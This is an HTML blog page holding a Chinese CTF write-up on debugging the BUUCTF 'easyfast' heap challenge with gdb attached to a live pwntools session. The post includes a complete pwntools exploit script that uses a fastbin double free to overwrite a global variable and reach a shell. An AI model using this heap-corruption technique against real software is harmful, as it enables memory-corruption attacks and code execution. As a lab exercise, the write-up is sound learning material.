@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Noto Sans Simplified Chinese:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"rjcnb666.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false,"announcement":{"enable":true}},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":"enable","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+
+
+  <meta name="description" content="gdb新的理解前言：其实感觉之前一直有gdb调试恐惧症。 但是通过最近的练习和复现，对gdb有了一些新的理解与感悟。 之前常常因为搞不清楚调试的位置，不知道怎么查看想看的程序执行情况而苦恼。 通过最近的联系理解了断点的重要性，以及一些新的gdb指令。 希望可以一直进步下去！！！ 新学会了用python交互模式进行gdb的单步调试 下面以一个简单的uaf堆题为例： 题目（buuctf easyfas">
+<meta property="og:type" content="article">
+<meta property="og:title" content="gdb新的理解">
+<meta property="og:url" content="https://rjcnb666.github.io/2025/11/12/gdb/index.html">
+<meta property="og:site_name" content="mvegetable&#39;blog">
+<meta property="og:description" content="gdb新的理解前言：其实感觉之前一直有gdb调试恐惧症。 但是通过最近的练习和复现，对gdb有了一些新的理解与感悟。 之前常常因为搞不清楚调试的位置，不知道怎么查看想看的程序执行情况而苦恼。 通过最近的联系理解了断点的重要性，以及一些新的gdb指令。 希望可以一直进步下去！！！ 新学会了用python交互模式进行gdb的单步调试 下面以一个简单的uaf堆题为例： 题目（buuctf easyfas">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://rjcnb666.github.io/gdb%5Cgdb1.png">
+<meta property="og:image" content="https://rjcnb666.github.io/image-20251112145102620.png">
+<meta property="og:image" content="https://rjcnb666.github.io/gdb2.png">
+<meta property="og:image" content="https://rjcnb666.github.io/image-20251112145421701.png">
+<meta property="og:image" content="https://rjcnb666.github.io/image-20251112145252356.png">
+<meta property="og:image" content="https://rjcnb666.github.io/image-20251112145305907.png">
+<meta property="og:image" content="https://rjcnb666.github.io/image-20251112150609622.png">
+<meta property="og:image" content="https://rjcnb666.github.io/image-20251112151018331.png">
+<meta property="og:image" content="https://rjcnb666.github.io/QQ_1762932098054.png">
+<meta property="og:image" content="https://rjcnb666.github.io/QQ_1762932109240.png">
+<meta property="og:image" content="https://rjcnb666.github.io/QQ_1762932126635.png">
+<meta property="og:image" content="https://rjcnb666.github.io/QQ_1762932409290.png">
+<meta property="og:image" content="https://rjcnb666.github.io/QQ_1762932489263.png">
+<meta property="og:image" content="https://rjcnb666.github.io/QQ_1762932787984.png">
+<meta property="og:image" content="https://rjcnb666.github.io/QQ_1762932811796.png">
+<meta property="og:image" content="https://rjcnb666.github.io/image-20251112153558163.png">
+<meta property="og:image" content="https://rjcnb666.github.io/image-20251112153909048.png">
+<meta property="og:image" content="https://rjcnb666.github.io/image-20251112154622804.png">
+<meta property="og:image" content="https://rjcnb666.github.io/image-20251112155101849.png">
+<meta property="og:image" content="https://rjcnb666.github.io/image-20251112155456001.png">
+<meta property="og:image" content="https://rjcnb666.github.io/image-20251112155433697.png">
+<meta property="og:image" content="https://rjcnb666.github.io/image-20251112162347772.png">
+<meta property="og:image" content="https://rjcnb666.github.io/image-20251112162428445.png">
+<meta property="og:image" content="https://rjcnb666.github.io/image-20251112162453383.png">
+<meta property="og:image" content="https://rjcnb666.github.io/image-20251112162721541.png">
+<meta property="og:image" content="https://rjcnb666.github.io/image-20251112162730716.png">
+<meta property="article:published_time" content="2025-11-12T09:30:00.000Z">
+<meta property="article:modified_time" content="2025-11-12T16:00:55.667Z">
+<meta property="article:author" content="rjc">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rjcnb666.github.io/gdb%5Cgdb1.png">
+
+<link rel="canonical" href="https://rjcnb666.github.io/2025/11/12/gdb/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>gdb新的理解 | mvegetable'blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">mvegetable'blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">the world of pwn</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>links</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/11/12/gdb/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/tou.jpg">
+      <meta itemprop="name" content="rjc">
+      <meta itemprop="description" content="pangpangpang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mvegetable'blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          gdb新的理解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-11-12 17:30:00" itemprop="dateCreated datePublished" datetime="2025-11-12T17:30:00+08:00">2025-11-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-11-13 00:00:55" itemprop="dateModified" datetime="2025-11-13T00:00:55+08:00">2025-11-13</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="far fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.2k</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="gdb新的理解"><a href="#gdb新的理解" class="headerlink" title="gdb新的理解"></a>gdb新的理解</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>其实感觉之前一直有gdb调试恐惧症。</p>
+<p>但是通过最近的练习和复现，对gdb有了一些新的理解与感悟。</p>
+<p>之前常常因为搞不清楚调试的位置，不知道怎么查看想看的程序执行情况而苦恼。</p>
+<p>通过最近的联系理解了断点的重要性，以及一些新的gdb指令。</p>
+<p>希望可以一直进步下去！！！</p>
+<p>新学会了用python交互模式进行gdb的单步调试</p>
+<p>下面以一个简单的uaf堆题为例：</p>
+<h2 id="题目（buuctf-easyfast）"><a href="#题目（buuctf-easyfast）" class="headerlink" title="题目（buuctf easyfast）:"></a>题目（buuctf easyfast）:</h2><h3 id="menu"><a href="#menu" class="headerlink" title="menu:"></a>menu:</h3><p><img src="/gdb%5Cgdb1.png" alt="gdb1"></p>
+<h3 id="creat"><a href="#creat" class="headerlink" title="creat:"></a>creat:</h3><p><img src="/image-20251112145102620.png" alt="image-20251112145102620"></p>
+<h3 id="shell"><a href="#shell" class="headerlink" title="shell:"></a>shell:</h3><p><img src="/gdb2.png" alt="gdb2"></p>
+<p><img src="/image-20251112145421701.png" alt="image-20251112145421701"></p>
+<p>这里可以看到data段的全局变量<strong>602090</strong>初始的时候是<strong>1</strong></p>
+<h3 id="delete"><a href="#delete" class="headerlink" title="delete:"></a>delete:</h3><p><img src="/image-20251112145252356.png" alt="image-20251112145252356"></p>
+<p>这里存在一个 **uaf **漏洞。</p>
+<h3 id="edit"><a href="#edit" class="headerlink" title="edit:"></a>edit:</h3><p><img src="/image-20251112145305907.png" alt="image-20251112145305907"></p>
+<h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p>这里的思路就是利<u>doublefree</u>或者 <u>uaf</u> 将 全局变量<strong>602090</strong>变为0</p>
+<h2 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 环境配置</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./easyfast&#x27;</span>)  <span class="comment"># 本地调试</span></span><br><span class="line"><span class="comment"># p = remote(&#x27;target.ip&#x27;, port)  # 远程连接</span></span><br><span class="line"></span><br><span class="line">target = <span class="number">0x602090</span>  <span class="comment"># 目标地址（如 GOT 表）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 堆操作函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;申请堆块&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size&gt;&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;释放堆块&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index, content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;填充堆块内容&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;触发漏洞函数&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] Exploit 流程</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># 申请两个 0x50 大小的堆块（0x40 + header）</span></span><br><span class="line">alloc(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 构造 Double Free</span></span><br><span class="line">free(<span class="number">0</span>)      <span class="comment"># 释放 chunk 0</span></span><br><span class="line">free(<span class="number">1</span>)      <span class="comment"># 释放 chunk 1</span></span><br><span class="line">free(<span class="number">0</span>)      <span class="comment"># 再次释放 chunk 0，形成 fastbin 链表：0 -&gt; 1 -&gt; 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 控制 fastbin 链表头</span></span><br><span class="line">payload = p64(target - <span class="number">0x10</span>)  <span class="comment"># 指向目标地址 - 0x10（chunk header）</span></span><br><span class="line">fill(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 重新分配，控制目标地址附近的内存</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># 分配到原 chunk 0 位置</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># 分配到原 chunk 1 位置，此时其 fd 指向 target-0x10</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># 分配到 target-0x10 附近，可以覆盖目标</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 覆盖目标内容（如 GOT 表项）</span></span><br><span class="line">payload = p64(<span class="number">0</span>)  <span class="comment"># 或者 system(&quot;/bin/sh&quot;) 的地址</span></span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 触发漏洞</span></span><br><span class="line">shell()</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="动态调试part1："><a href="#动态调试part1：" class="headerlink" title="动态调试part1："></a><strong>动态调试part1</strong>：</h2><ul>
+<li>首先开启一个<strong>python3</strong> 解释器:</li>
+</ul>
+<p><img src="/image-20251112150609622.png" alt="image-20251112150609622"></p>
+<p>这里同时也可以看到我们启动了一个进程72687</p>
+<ul>
+<li>同时开启另一个<strong>gdb</strong>终端：</li>
+</ul>
+<p><img src="/image-20251112151018331.png" alt="image-20251112151018331"></p>
+<p><code>attach (pid)</code>在gdb里面附件进程。</p>
+<ul>
+<li>设置关键断点：</li>
+</ul>
+<p><img src="/QQ_1762932098054.png" alt="QQ_1762932098054"></p>
+<p><img src="/QQ_1762932109240.png" alt="QQ_1762932109240"></p>
+<p><img src="/QQ_1762932126635.png" alt="QQ_1762932126635"></p>
+<p>在三个关键函数的返回处设置断点</p>
+<p><img src="/QQ_1762932409290.png" alt="QQ_1762932409290"></p>
+<p>然后continue等待解释器输入</p>
+<p><img src="/QQ_1762932489263.png" alt="QQ_1762932489263"></p>
+<ul>
+<li>开始进行单步调试：</li>
+</ul>
+<p><img src="/QQ_1762932787984.png" alt="QQ_1762932787984"></p>
+<p>这里定义函数</p>
+<p>然后下面我们执行了<code>alloc(0x40)</code>创建了0x40大小的堆块</p>
+<p><img src="/QQ_1762932811796.png" alt="QQ_1762932811796"></p>
+<p>这里可以看到右边的终端停在了我们设置的断点</p>
+<p><img src="/image-20251112153558163.png" alt="image-20251112153558163"></p>
+<p>这里也可以看到我们的堆块创建成功。</p>
+<p>这样调试可以看到每步的执行情况。</p>
+<p>每次进入<code>Continuing.</code>等待执行时候在python解释器执行新的指令</p>
+<p><img src="/image-20251112153909048.png" alt="image-20251112153909048"></p>
+<p>这里看到成功把<code>chunk0</code>的<code>fd</code>改为<code>全局变量-0x10</code>,然后后面通过edit就可以修改这个伪造的堆块，也就是我们需要利用全局变量</p>
+<p><img src="/image-20251112154622804.png" alt="image-20251112154622804"></p>
+<p>查看全局变量<code>buf</code></p>
+<p>可以看到我们的目标地址被当作了一个堆块。后面就修改堆块3即可。</p>
+<p><img src="/image-20251112155101849.png" alt="image-20251112155101849"></p>
+<p>这里可以看到我们成功启动了shell的进程：</p>
+<p><img src="/image-20251112155456001.png" alt="image-20251112155456001"></p>
+<p><img src="/image-20251112155433697.png" alt="image-20251112155433697"></p>
+<p><strong>注意</strong>：</p>
+<p><code>ctrl + d </code>退出python解释器</p>
+<p>想看执行情况可以随时<code>ctrl + c</code>暂停gdb终端</p>
+<h2 id="动态调试part2："><a href="#动态调试part2：" class="headerlink" title="动态调试part2："></a><strong>动态调试part2</strong>：</h2><p><img src="/image-20251112162347772.png" alt="image-20251112162347772"></p>
+<p>这里可以看到我们进入了<code>interactive mode</code></p>
+<p><img src="/image-20251112162428445.png" alt="image-20251112162428445"></p>
+<p><img src="/image-20251112162453383.png" alt="image-20251112162453383"></p>
+<p>继续4执行<code>shell()</code>成功</p>
+<p>同时可以利用<code>interactive mode</code>和<code>gdb.attach()</code></p>
+<p><img src="/image-20251112162721541.png" alt="image-20251112162721541"></p>
+<p><img src="/image-20251112162730716.png" alt="image-20251112162730716"></p>
+<p>这里就是说当写脚本的时候可以利用<code>interactive mode</code> 继续往下执行<code>gdb.attach</code>后面的内容。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Pwn/" rel="tag"># Pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/07/26/TCP-IP-%E5%8D%8F%E8%AE%AE%E6%A0%88%E7%9A%84%E5%88%86%E5%B1%82%E7%BB%93%E6%9E%84/" rel="prev" title="TCP/IP 协议栈的分层结构">
+      <i class="fa fa-chevron-left"></i> TCP/IP 协议栈的分层结构
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#gdb%E6%96%B0%E7%9A%84%E7%90%86%E8%A7%A3"><span class="nav-number">1.</span> <span class="nav-text">gdb新的理解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">前言：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%88buuctf-easyfast%EF%BC%89"><span class="nav-number">1.2.</span> <span class="nav-text">题目（buuctf easyfast）:</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#menu"><span class="nav-number">1.2.1.</span> <span class="nav-text">menu:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#creat"><span class="nav-number">1.2.2.</span> <span class="nav-text">creat:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shell"><span class="nav-number">1.2.3.</span> <span class="nav-text">shell:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#delete"><span class="nav-number">1.2.4.</span> <span class="nav-text">delete:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#edit"><span class="nav-number">1.2.5.</span> <span class="nav-text">edit:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="nav-number">1.2.6.</span> <span class="nav-text">思路：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%EF%BC%9A"><span class="nav-number">1.3.</span> <span class="nav-text">脚本：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95part1%EF%BC%9A"><span class="nav-number">1.4.</span> <span class="nav-text">动态调试part1：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95part2%EF%BC%9A"><span class="nav-number">1.5.</span> <span class="nav-text">动态调试part2：</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rjc"
+      src="/images/tou.jpg">
+  <p class="site-author-name" itemprop="name">rjc</p>
+  <div class="site-description" itemprop="description">pangpangpang</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/rjcnb666" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;rjcnb666" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2858052971@qq.com" title="E-Mail → mailto:2858052971@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+ 
+        
+        
+          <!-- 公告模块 -->
+<div class="sidebar-module">
+  <!-- 模块标题 -->
+  <h3 class="sidebar-title">
+    <i class="fa fa-bullhorn"></i> 最新公告
+  </h3>
+  <!-- 模块内容 -->
+  <div class="sidebar-content">
+    <p>🎉 欢迎光临！！！这里是pwn学弟的个人博客！！！让我们一起pangpangpang！！！！</p>
+    <p>😊 "当你心情郁闷的时候，用手托腮就好了，手臂会因为帮上忙而开心的。" 😊</p>
+    <p>👉 2858052971@qq.com </p>
+    
+    <!-- 支持 HTML 标签，比如添加链接 -->
+    <p>更多信息：<a href="/about/" target="_blank">关于本站</a></p>
+  </div>
+</div>
+        
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rjc</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
